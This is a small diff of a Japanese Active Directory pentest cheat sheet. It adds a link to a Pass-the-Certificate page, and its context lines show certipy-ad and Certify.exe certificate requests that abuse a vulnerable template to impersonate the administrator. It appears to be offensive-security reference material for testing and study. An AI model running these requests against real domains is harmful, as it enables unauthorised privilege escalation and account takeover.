@@ -38,4 +38,4 @@ certipy-ad req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -target <DC_D
 Certify.exe request /ca:<DOMAIN>\<CA_NAME> /template:<VULN_TEMPLATE> /altname:administrator
 ```
 
-証明書を取得すると[Pass-the-Certificate攻撃]()でTGTを取得し、認証することができる
+証明書を取得すると[Pass-the-Certificate攻撃](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Kerberos/Pass%20The%20Certificate.md)でTGTを取得し、認証することができる
